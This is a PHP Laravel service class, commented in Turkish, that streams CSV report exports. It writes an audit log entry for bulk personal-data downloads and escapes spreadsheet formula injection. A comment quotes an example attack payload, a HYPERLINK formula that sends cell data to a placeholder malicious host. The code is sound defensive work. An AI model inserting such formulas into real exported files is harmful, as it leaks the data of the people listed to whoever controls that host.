<?php

namespace App\Servisler;

use Illuminate\Database\Eloquent\Builder;
use Illuminate\Support\Facades\Response;
use Symfony\Component\HttpFoundation\StreamedResponse;

/**
 * Rapor dışa aktarımı -- Plan v1.0 md.8.
 *
 * Akış hâlinde yazar: maç günü on binlerce satır olabilir, hepsini belleğe
 * almak PHP'yi düşürür. Excel Türkçe karakterleri doğru açsın diye BOM eklenir.
 */
class CsvDisaAktar
{
    /**
     * @param  array<int, string>  $basliklar
     * @param  callable(object): array<int, mixed>  $satir
     * @param  ?string  $olay  Denetim olayı adı. Verilmezse kayıt YAZILMAZ --
     *                         yalnızca kişisel veri içermeyen dökümler için.
     */
    public function akit(
        Builder $sorgu,
        string $dosyaAdi,
        array $basliklar,
        callable $satir,
        ?string $olay = null,
    ): StreamedResponse {
        /*
         * 🔒 TOPLU KİŞİSEL VERİ İNDİRME DENETİME DÜŞER (KVKK, Plan md.10-11).
         * Çelişki açıktı: TEK bir hassas evrak görüntülemesi loglanıyordu
         * (EvrakController), ama tüm akredite basın mensuplarının ad,
         * e-posta ve telefonunu tek dosyada indirmek loglanmıyordu.
         *
         * Sayım akıştan ÖNCE alınır: `streamDownload` gövdesi yanıt
         * gönderilirken çalışır, orada atılan istisna dosyayı yarım bırakır.
         */
        if ($olay !== null) {
            app(DenetimYazici::class)->yaz($olay, yeni: [
                'dosya' => $dosyaAdi,
                'satir_sayisi' => (clone $sorgu)->toBase()->getCountForPagination(),
            ]);
        }

        return Response::streamDownload(function () use ($sorgu, $basliklar, $satir) {
            $cikti = fopen('php://output', 'w');
            fwrite($cikti, "\xEF\xBB\xBF");

            fputcsv($cikti, array_map($this->guvenliHucre(...), $basliklar), ';');

            $sorgu->chunkById(500, function ($kayitlar) use ($cikti, $satir) {
                foreach ($kayitlar as $kayit) {
                    fputcsv($cikti, array_map($this->guvenliHucre(...), $satir($kayit)), ';');
                }
            });

            fclose($cikti);
        }, $dosyaAdi.'-'.now()->format('Ymd-His').'.csv', [
            'Content-Type' => 'text/csv; charset=UTF-8',
        ]);
    }

    /**
     * 🔒 EXCEL FORMÜL ENJEKSİYONU. `=`, `+`, `-`, `@`, TAB ya da CR ile
     * başlayan hücreyi Excel FORMÜL olarak çalıştırır. Başvuran adını
     * `=HYPERLINK("http://kotu.site/?d="&A1;"Tıkla")` yazarsa, CSV'yi açan
     * yetkilinin Excel'i o hücreyi işler ve dosyadaki veriyi dışarı taşır.
     *
     * `resmi_unvan` ve `name` kullanıcı girdisidir ve yalnızca UZUNLUĞU
     * doğrulanır. Öne tek tırnak koymak hücreyi metne zorlar.
     */
    private function guvenliHucre(mixed $deger): mixed
    {
        return is_string($deger) && preg_match('/^[=+\-@\t\r]/', $deger)
            ? "'".$deger
            : $deger;
    }
}
